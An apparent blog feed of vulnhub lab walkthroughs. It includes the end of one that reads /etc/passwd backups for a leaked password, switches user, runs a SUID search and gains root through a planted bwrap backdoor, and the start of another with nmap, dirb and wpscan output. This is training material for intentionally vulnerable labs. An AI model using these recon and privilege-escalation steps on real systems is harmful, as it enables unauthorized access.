Management,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">messagebus:x:103:106::/nonexistent:/usr/sbin/nologin</span><br><span class="line">syslog:x:104:110::/home/syslog:/usr/sbin/nologin</span><br><span class="line">_apt:x:105:65534::/nonexistent:/usr/sbin/nologin</span><br><span class="line">uuidd:x:106:112::/run/uuidd:/usr/sbin/nologin</span><br><span class="line">tcpdump:x:107:113::/nonexistent:/usr/sbin/nologin</span><br><span class="line">sshd:x:108:65534::/run/sshd:/usr/sbin/nologin</span><br><span class="line">landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin</span><br><span class="line">pollinate:x:110:1::/var/cache/pollinate:/bin/<span class="literal">false</span></span><br><span class="line">mike:x:1000:1000:mike,,,:/home/mike:/bin/bash</span><br><span class="line">systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin</span><br><span class="line">mysql:x:111:118:MySQL Server,,,:/nonexistent:/bin/<span class="literal">false</span></span><br><span class="line">postfix:x:112:120::/var/spool/postfix:/usr/sbin/nologin</span><br><span class="line">ftp:x:113:122:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin</span><br><span class="line">joe:x:1001:1001:hyphens rule:/home/joe:/bin/bash</span><br></pre></td></tr></table></figure>

<p>没有发现joe用户的密码，继续遍历passwd-</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mike@inplainsight:/etc$ cat passwd-</span><br><span class="line">cat passwd-</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">systemd-network:x:101:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">messagebus:x:103:106::/nonexistent:/usr/sbin/nologin</span><br><span class="line">syslog:x:104:110::/home/syslog:/usr/sbin/nologin</span><br><span class="line">_apt:x:105:65534::/nonexistent:/usr/sbin/nologin</span><br><span class="line">uuidd:x:106:112::/run/uuidd:/usr/sbin/nologin</span><br><span class="line">tcpdump:x:107:113::/nonexistent:/usr/sbin/nologin</span><br><span class="line">sshd:x:108:65534::/run/sshd:/usr/sbin/nologin</span><br><span class="line">landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin</span><br><span class="line">pollinate:x:110:1::/var/cache/pollinate:/bin/<span class="literal">false</span></span><br><span class="line">mike:x:1000:1000:mike,,,:/home/mike:/bin/bash</span><br><span class="line">systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin</span><br><span class="line">mysql:x:111:118:MySQL Server,,,:/nonexistent:/bin/<span class="literal">false</span></span><br><span class="line">postfix:x:112:120::/var/spool/postfix:/usr/sbin/nologin</span><br><span class="line">ftp:x:113:122:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin</span><br><span class="line">joe:x:1001:1001:joe:SmashMouthNoThanks:/home/joe:/bin/bash</span><br></pre></td></tr></table></figure>

<p>得到用户密码:joe/SmashMouthNoThanks，然后切换到joe用户</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mike@inplainsight:/etc$ su joe</span><br><span class="line">su joe</span><br><span class="line">Password: SmashMouthNoThanks</span><br><span class="line"></span><br><span class="line">joe@inplainsight:/etc$ id</span><br><span class="line">id</span><br><span class="line">uid=1001(joe) gid=1001(joe) groups=1001(joe)</span><br><span class="line">joe@inplainsight:/etc$ whoami</span><br><span class="line">whoami</span><br><span class="line">joe</span><br><span class="line">joe@inplainsight:/$ <span class="built_in">cd</span> /home</span><br><span class="line"><span class="built_in">cd</span> /home</span><br><span class="line">joe@inplainsight:/home$ ls</span><br><span class="line">ls</span><br><span class="line">joe  mike</span><br><span class="line">joe@inplainsight:/home$ <span class="built_in">cd</span> joe</span><br><span class="line"><span class="built_in">cd</span> joe</span><br><span class="line">joe@inplainsight:~$ ls  </span><br><span class="line">ls</span><br><span class="line">journal</span><br><span class="line">joe@inplainsight:~$ cat journal</span><br><span class="line">cat journal</span><br><span class="line">glad i added that root backdoor before boss person removed my privileges :)</span><br></pre></td></tr></table></figure>

<p>意思是，系统中已经有别人先添加好的后门了,要做的唯一一件事就是获取目标的最后一个flag。为了得到它，我们使用命令find查找SUID。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
<p>在执行此命令之前，我们将目录更改为“/”，并在运行该命令后找到以下有用的二进制文件。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">joe@inplainsight:~$ find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">/usr/bin/bwrap</span><br><span class="line">/usr/bin/mount</span><br><span class="line">/usr/bin/at</span><br><span class="line">/usr/bin/umount</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/fusermount</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/su</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/pkexec</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/usr/lib/policykit-1/polkit-agent-helper-1</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br><span class="line">/usr/lib/snapd/snap-confine</span><br></pre></td></tr></table></figure>

<p>在/bwrap中，找到了最后一个flag，如下图：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">joe@inplainsight:~$ bwrap</span><br><span class="line">bwrap</span><br><span class="line">root@inplainsight:~<span class="comment"># id</span></span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root),1001(joe)</span><br><span class="line">root@inplainsight:~<span class="comment"># whoami</span></span><br><span class="line">whoami</span><br><span class="line">root</span><br><span class="line">root@inplainsight:~<span class="comment"># cd /root</span></span><br><span class="line"><span class="built_in">cd</span> /root</span><br><span class="line">root@inplainsight:/root<span class="comment"># ls</span></span><br><span class="line">ls</span><br><span class="line">flag.txt</span><br><span class="line">root@inplainsight:/root<span class="comment"># cat flag.txt</span></span><br><span class="line">cat flag.txt</span><br><span class="line"></span><br><span class="line">                                          __          </span><br><span class="line">  ____  ____   ____    ________________ _/  |_  ______</span><br><span class="line">_/ ___\/  _ \ /    \  / ___\_  __ \__  \\   __\/  ___/</span><br><span class="line">\  \__(  &lt;_&gt; )   |  \/ /_/  &gt;  | \// __ \|  |  \___ \ </span><br><span class="line"> \___  &gt;____/|___|  /\___  /|__|  (____  /__| /____  &gt;</span><br><span class="line">     \/           \//_____/            \/          \/ </span><br><span class="line"></span><br><span class="line">easy right? thanks <span class="keyword">for</span> playing.</span><br><span class="line"></span><br><span class="line">feel free to leave feedback with me @bzyo_</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub155.jpg"></p>
<p>成功提权，帅的一批。。。</p>
<ul>
<li>知识点：wordpress文件上传</li>
</ul>
<p><font color="red">Game over</font></p>
<p>不好意思，这次还是没有找到希腊某位大佬的傻瓜式一键通关脚本，i am so sorry about this…It’s a pity…</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg"></p>
<p><font color="green"><strong><em>The end,to be continue…</em></strong></font></p>
]]></content>
      <categories>
        <category>vulnhub walkthrough</category>
      </categories>
      <tags>
        <tag>vulnhub靶机练习</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub靶机渗透[hackNos-Os-hackNos-2-1]</title>
    <url>/2019/12/19/hackNos-Os-hackNos-2-1/</url>
    <content><![CDATA[<p>名称：hackNos：Os-hackNos-2.1<br>发布日期：29 Nov 2019</p>
<p>下载：</p>
<ul>
<li>Download: <span class="exturl" data-url="aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL29wZW4/aWQ9MVVzemZxb29tbTdpdl9jNGFpdU5iNlVQbDhaZ2Z2NThz">https://drive.google.com/open?id=1Uszfqoomm7iv_c4aiuNb6UPl8Zgfv58s<i class="fa fa-external-link-alt"></i></span></li>
<li>Download (Mirror): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9oYWNrbm9zL09zLWhhY2tOb3MtMi4xLm92YQ==">https://download.vulnhub.com/hacknos/Os-hackNos-2.1.ova<i class="fa fa-external-link-alt"></i></span></li>
<li>Download (Torrent): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9oYWNrbm9zL09zLWhhY2tOb3MtMi4xLm92YS50b3JyZW50">https://download.vulnhub.com/hacknos/Os-hackNos-2.1.ova.torrent<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p>难度：容易中级</p>
<p>flag：2个flag第一个user和第二个root</p>
<p>学习：Web应用程序 枚举 密码破解</p>
<a id="more"></a>

<h3 id="网络配置"><a href="#网络配置" class="headerlink" title="网络配置"></a>网络配置</h3><p>由于此靶机使用virtualbox导出的ova文件，无法适应vmware的网络配置，故将靶机放在vbox中，而攻击机kali放在vmware中，网络如下图配置方能让两台机器相互通信</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub71.jpg"></p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub72.jpg"></p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub73.jpg"></p>
<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>上nmap</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sn -v 192.168.56.0/24</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.56.101</span><br><span class="line">Host is up (0.00027s latency).</span><br><span class="line">MAC Address: 08:00:27:89:DE:B1 (Oracle VirtualBox virtual NIC)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -A -v -sV -Pn -T4 --script=vuln 192.168.56.101</span></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_http-csrf: Couldn<span class="string">&#x27;t find any CSRF vulnerabilities.</span></span><br><span class="line"><span class="string">|_http-dombased-xss: Couldn&#x27;</span>t find any DOM based XSS.</span><br><span class="line">| http-enum: </span><br><span class="line">|_  /tsweb/: Remote Desktop Web Connection</span><br><span class="line">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br><span class="line">|_http-stored-xss: Couldn<span class="string">&#x27;t find any stored XSS vulnerabilities.</span></span><br></pre></td></tr></table></figure>

<p>开了2个端口，然后dirb目录扫一波</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># dirb http://192.168.56.101/</span></span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">DIRB v2.22    </span><br><span class="line">By The Dark Raver</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">START_TIME: Thu Dec 19 00:38:44 2019</span><br><span class="line">URL_BASE: http://192.168.56.101/</span><br><span class="line">WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">GENERATED WORDS: 4612                                                          </span><br><span class="line"></span><br><span class="line">---- Scanning URL: http://192.168.56.101/ ----</span><br><span class="line">+ http://192.168.56.101/index.html (CODE:200|SIZE:10918)                                              </span><br><span class="line">+ http://192.168.56.101/server-status (CODE:403|SIZE:279)                                             </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.101/tsweb/                                                           </span><br><span class="line">                                                                                                      </span><br><span class="line">---- Entering directory: http://192.168.56.101/tsweb/ ----</span><br><span class="line">+ http://192.168.56.101/tsweb/index.php (CODE:301|SIZE:0)                                             </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.101/tsweb/wp-admin/                                                  </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.101/tsweb/wp-content/                                                </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.101/tsweb/wp-includes/                                               </span><br><span class="line">+ http://192.168.56.101/tsweb/xmlrpc.php (CODE:405|SIZE:42)                                           </span><br><span class="line">                                                                                                      </span><br><span class="line">---- Entering directory: http://192.168.56.101/tsweb/wp-admin/ ----</span><br><span class="line">+ http://192.168.56.101/tsweb/wp-admin/admin.php (CODE:302|SIZE:0)                                    </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.101/tsweb/wp-admin/css/                                              </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.101/tsweb/wp-admin/images/                                           </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.101/tsweb/wp-admin/includes/                                         </span><br><span class="line">+ http://192.168.56.101/tsweb/wp-admin/index.php (CODE:302|SIZE:0)                                    </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.101/tsweb/wp-admin/js/                                               </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.101/tsweb/wp-admin/maint/                                            </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.101/tsweb/wp-admin/network/                                          </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.101/tsweb/wp-admin/user/                                             </span><br><span class="line">                                                                                                      </span><br><span class="line">---- Entering directory: http://192.168.56.101/tsweb/wp-content/ ----</span><br><span class="line">+ http://192.168.56.101/tsweb/wp-content/index.php (CODE:200|SIZE:0)                                  </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.101/tsweb/wp-content/plugins/                                        </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.101/tsweb/wp-content/themes/                                         </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.101/tsweb/wp-content/upgrade/                                        </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.101/tsweb/wp-content/uploads/                                   </span><br><span class="line">                                                                                                      </span><br><span class="line">---- Entering directory: http://192.168.56.101/tsweb/wp-admin/network/ ----</span><br><span class="line">+ http://192.168.56.101/tsweb/wp-admin/network/admin.php (CODE:302|SIZE:0)                            </span><br><span class="line">+ http://192.168.56.101/tsweb/wp-admin/network/index.php (CODE:302|SIZE:0)                            </span><br><span class="line">                                                                                                      </span><br><span class="line">---- Entering directory: http://192.168.56.101/tsweb/wp-admin/user/ ----</span><br><span class="line">+ http://192.168.56.101/tsweb/wp-admin/user/admin.php (CODE:302|SIZE:0)                               </span><br><span class="line">+ http://192.168.56.101/tsweb/wp-admin/user/index.php (CODE:302|SIZE:0)                               </span><br><span class="line">                                                                                                      </span><br><span class="line">---- Entering directory: http://192.168.56.101/tsweb/wp-content/plugins/ ----</span><br><span class="line">+ http://192.168.56.101/tsweb/wp-content/plugins/index.php (CODE:200|SIZE:0)                          </span><br><span class="line">                                                                                                      </span><br><span class="line">---- Entering directory: http://192.168.56.101/tsweb/wp-content/themes/ ----</span><br><span class="line">+ http://192.168.56.101/tsweb/wp-content/themes/index.php (CODE:200|SIZE:0)                           </span><br><span class="line">                                                                                                                      </span><br><span class="line">-----------------</span><br><span class="line">END_TIME: Thu Dec 19 00:39:22 2019</span><br><span class="line">DOWNLOADED: 36896 - FOUND: 13</span><br></pre></td></tr></table></figure>

<p>可以发现是wordpress程序搭建的,wpscan一波</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># wpscan --url http://192.168.56.101/tsweb/ -e ap,at,tt,cb</span></span><br><span class="line">_______________________________________________________________</span><br><span class="line">         __          _______   _____</span><br><span class="line">         \ \        / /  __ \ / ____|</span><br><span class="line">          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®</span><br><span class="line">           \ \/  \/ / |  ___/ \___ \ / __|/ _` | <span class="string">&#x27;_ \</span></span><br><span class="line"><span class="string">            \  /\  /  | |     ____) | (__| (_| | | | |</span></span><br><span class="line"><span class="string">             \/  \/   |_|    |_____/ \___|\__,_|_| |_|</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">         WordPress Security Scanner by the WPScan Team</span></span><br><span class="line"><span class="string">                         Version 3.7.5</span></span><br><span class="line"><span class="string">       Sponsored by Automattic - https://automattic.com/</span></span><br><span class="line"><span class="string">       @_WPScan_, @ethicalhack3r, @erwan_lr, @_FireFart_</span></span><br><span class="line"><span class="string">_______________________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] URL: http://192.168.56.101/tsweb/</span></span><br><span class="line"><span class="string">[+] Started: Thu Dec 19 03:35:07 2019</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Interesting Finding(s):</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] http://192.168.56.101/tsweb/</span></span><br><span class="line"><span class="string"> | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)</span></span><br><span class="line"><span class="string"> | Found By: Headers (Passive Detection)</span></span><br><span class="line"><span class="string"> | Confidence: 100%</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] http://192.168.56.101/tsweb/xmlrpc.php</span></span><br><span class="line"><span class="string"> | Found By: Direct Access (Aggressive Detection)</span></span><br><span class="line"><span class="string"> | Confidence: 100%</span></span><br><span class="line"><span class="string"> | References:</span></span><br><span class="line"><span class="string"> |  - http://codex.wordpress.org/XML-RPC_Pingback_API</span></span><br><span class="line"><span class="string"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner</span></span><br><span class="line"><span class="string"> |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos</span></span><br><span class="line"><span class="string"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login</span></span><br><span class="line"><span class="string"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] http://192.168.56.101/tsweb/readme.html</span></span><br><span class="line"><span class="string"> | Found By: Direct Access (Aggressive Detection)</span></span><br><span class="line"><span class="string"> | Confidence: 100%</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Upload directory has listing enabled: http://192.168.56.101/tsweb/wp-content/uploads/</span></span><br><span class="line"><span class="string"> | Found By: Direct Access (Aggressive Detection)</span></span><br><span class="line"><span class="string"> | Confidence: 100%</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] http://192.168.56.101/tsweb/wp-cron.php</span></span><br><span class="line"><span class="string"> | Found By: Direct Access (Aggressive Detection)</span></span><br><span class="line"><span class="string"> | Confidence: 60%</span></span><br><span class="line"><span class="string"> | References:</span></span><br><span class="line"><span class="string"> |  - https://www.iplocation.net/defend-wordpress-from-ddos</span></span><br><span class="line"><span class="string"> |  - https://github.com/wpscanteam/wpscan/issues/1299</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] WordPress version 5.3 identified (Insecure, released on 2019-11-12).</span></span><br><span class="line"><span class="string"> | Found By: Rss Generator (Passive Detection)</span></span><br><span class="line"><span class="string"> |  - http://192.168.56.101/tsweb/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=5.3&lt;/generator&gt;</span></span><br><span class="line"><span class="string"> |  - http://192.168.56.101/tsweb/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=5.3&lt;/generator&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] WordPress theme in use: twentytwenty</span></span><br><span class="line"><span class="string"> | Location: http://192.168.56.101/tsweb/wp-content/themes/twentytwenty/</span></span><br><span class="line"><span class="string"> | Last Updated: 2019-12-13T00:00:00.000Z</span></span><br><span class="line"><span class="string"> | Readme: http://192.168.56.101/tsweb/wp-content/themes/twentytwenty/readme.txt</span></span><br><span class="line"><span class="string"> | [!] The version is out of date, the latest version is 1.1</span></span><br><span class="line"><span class="string"> | Style URL: http://192.168.56.101/tsweb/wp-content/themes/twentytwenty/style.css?ver=1.0</span></span><br><span class="line"><span class="string"> | Style Name: Twenty Twenty</span></span><br><span class="line"><span class="string"> | Style URI: https://wordpress.org/themes/twentytwenty/</span></span><br><span class="line"><span class="string"> | Description: Our default theme for 2020 is designed to take full advantage of the flexibility of the block editor...</span></span><br><span class="line"><span class="string"> | Author: the WordPress team</span></span><br><span class="line"><span class="string"> | Author URI: https://wordpress.org/</span></span><br><span class="line"><span class="string"> |</span></span><br><span class="line"><span class="string"> | Found By: Css Style In Homepage (Passive Detection)</span></span><br><span class="line"><span class="string"> |</span></span><br><span class="line"><span class="string"> | Version: 1.0 (80% confidence)</span></span><br><span class="line"><span class="string"> | Found By: Style (Passive Detection)</span></span><br><span class="line"><span class="string"> |  - http://192.168.56.101/tsweb/wp-content/themes/twentytwenty/style.css?ver=1.0, Match: &#x27;</span>Version: 1.0<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Enumerating All Plugins (via Passive Methods)</span></span><br><span class="line"><span class="string">[+] Checking Plugin Versions (via Passive and Aggressive Methods)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[i] Plugin(s) Identified:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] gracemedia-media-player</span></span><br><span class="line"><span class="string"> | Location: http://192.168.56.101/tsweb/wp-content/plugins/gracemedia-media-player/</span></span><br><span class="line"><span class="string"> | Latest Version: 1.0 (up to date)</span></span><br><span class="line"><span class="string"> | Last Updated: 2013-07-21T15:09:00.000Z</span></span><br><span class="line"><span class="string"> |</span></span><br><span class="line"><span class="string"> | Found By: Urls In Homepage (Passive Detection)</span></span><br><span class="line"><span class="string"> |</span></span><br><span class="line"><span class="string"> | Version: 1.0 (100% confidence)</span></span><br><span class="line"><span class="string"> | Found By: Readme - Stable Tag (Aggressive Detection)</span></span><br><span class="line"><span class="string"> |  - http://192.168.56.101/tsweb/wp-content/plugins/gracemedia-media-player/readme.txt</span></span><br><span class="line"><span class="string"> | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)</span></span><br><span class="line"><span class="string"> |  - http://192.168.56.101/tsweb/wp-content/plugins/gracemedia-media-player/readme.txt</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Enumerating All Themes (via Passive and Aggressive Methods)</span></span><br><span class="line"><span class="string"> Checking Known Locations - Time: 00:00:38 &lt;=======================================================================================================================================================&gt; (20466 / 20466) 100.00% Time: 00:00:38</span></span><br><span class="line"><span class="string">[+] Checking Theme Versions (via Passive and Aggressive Methods)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[i] Theme(s) Identified:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] twentynineteen</span></span><br><span class="line"><span class="string"> | Location: http://192.168.56.101/tsweb/wp-content/themes/twentynineteen/</span></span><br><span class="line"><span class="string"> | Latest Version: 1.4 (up to date)</span></span><br><span class="line"><span class="string"> | Last Updated: 2019-11-12T00:00:00.000Z</span></span><br><span class="line"><span class="string"> | Readme: http://192.168.56.101/tsweb/wp-content/themes/twentynineteen/readme.txt</span></span><br><span class="line"><span class="string"> | Style URL: http://192.168.56.101/tsweb/wp-content/themes/twentynineteen/style.css</span></span><br><span class="line"><span class="string"> | Style Name: Twenty Nineteen</span></span><br><span class="line"><span class="string"> | Style URI: https://wordpress.org/themes/twentynineteen/</span></span><br><span class="line"><span class="string"> | Description: Our 2019 default theme is designed to show off the power of the block editor. It features custom sty...</span></span><br><span class="line"><span class="string"> | Author: the WordPress team</span></span><br><span class="line"><span class="string"> | Author URI: https://wordpress.org/</span></span><br><span class="line"><span class="string"> |</span></span><br><span class="line"><span class="string"> | Found By: Known Locations (Aggressive Detection)</span></span><br><span class="line"><span class="string"> |</span></span><br><span class="line"><span class="string"> | Version: 1.4 (80% confidence)</span></span><br><span class="line"><span class="string"> | Found By: Style (Passive Detection)</span></span><br><span class="line"><span class="string"> |  - http://192.168.56.101/tsweb/wp-content/themes/twentynineteen/style.css, Match: &#x27;</span>Version: 1.4<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] twentyseventeen</span></span><br><span class="line"><span class="string"> | Location: http://192.168.56.101/tsweb/wp-content/themes/twentyseventeen/</span></span><br><span class="line"><span class="string"> | Latest Version: 2.2 (up to date)</span></span><br><span class="line"><span class="string"> | Last Updated: 2019-05-07T00:00:00.000Z</span></span><br><span class="line"><span class="string"> | Readme: http://192.168.56.101/tsweb/wp-content/themes/twentyseventeen/readme.txt</span></span><br><span class="line"><span class="string"> | Style URL: http://192.168.56.101/tsweb/wp-content/themes/twentyseventeen/style.css</span></span><br><span class="line"><span class="string"> | Style Name: Twenty Seventeen</span></span><br><span class="line"><span class="string"> | Style URI: https://wordpress.org/themes/twentyseventeen/</span></span><br><span class="line"><span class="string"> | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...</span></span><br><span class="line"><span class="string"> | Author: the WordPress team</span></span><br><span class="line"><span class="string"> | Author URI: https://wordpress.org/</span></span><br><span class="line"><span class="string"> |</span></span><br><span class="line"><span class="string"> | Found By: Known Locations (Aggressive Detection)</span></span><br><span class="line"><span class="string"> |</span></span><br><span class="line"><span class="string"> | Version: 2.2 (80% confidence)</span></span><br><span class="line"><span class="string"> | Found By: Style (Passive Detection)</span></span><br><span class="line"><span class="string"> |  - http://192.168.56.101/tsweb/wp-content/themes/twentyseventeen/style.css, Match: &#x27;</span>Version: 2.2<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] twentysixteen</span></span><br><span class="line"><span class="string"> | Location: http://192.168.56.101/tsweb/wp-content/themes/twentysixteen/</span></span><br><span class="line"><span class="string"> | Latest Version: 2.0 (up to date)</span></span><br><span class="line"><span class="string"> | Last Updated: 2019-05-07T00:00:00.000Z</span></span><br><span class="line"><span class="string"> | Readme: http://192.168.56.101/tsweb/wp-content/themes/twentysixteen/readme.txt</span></span><br><span class="line"><span class="string"> | Style URL: http://192.168.56.101/tsweb/wp-content/themes/twentysixteen/style.css</span></span><br><span class="line"><span class="string"> | Style Name: Twenty Sixteen</span></span><br><span class="line"><span class="string"> | Style URI: https://wordpress.org/themes/twentysixteen/</span></span><br><span class="line"><span class="string"> | Description: Twenty Sixteen is a modernized take on an ever-popular WordPress layout — the horizontal masthead ...</span></span><br><span class="line"><span class="string"> | Author: the WordPress team</span></span><br><span class="line"><span class="string"> | Author URI: https://wordpress.org/</span></span><br><span class="line"><span class="string"> |</span></span><br><span class="line"><span class="string"> | Found By: Known Locations (Aggressive Detection)</span></span><br><span class="line"><span class="string"> |</span></span><br><span class="line"><span class="string"> | Version: 2.0 (80% confidence)</span></span><br><span class="line"><span class="string"> | Found By: Style (Passive Detection)</span></span><br><span class="line"><span class="string"> |  - http://192.168.56.101/tsweb/wp-content/themes/twentysixteen/style.css, Match: &#x27;</span>Version: 2.0<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] twentytwenty</span></span><br><span class="line"><span class="string"> | Location: http://192.168.56.101/tsweb/wp-content/themes/twentytwenty/</span></span><br><span class="line"><span class="string"> | Last Updated: 2019-12-13T00:00:00.000Z</span></span><br><span class="line"><span class="string"> | Readme: http://192.168.56.101/tsweb/wp-content/themes/twentytwenty/readme.txt</span></span><br><span class="line"><span class="string"> | [!] The version is out of date, the latest version is 1.1</span></span><br><span class="line"><span class="string"> | Style URL: 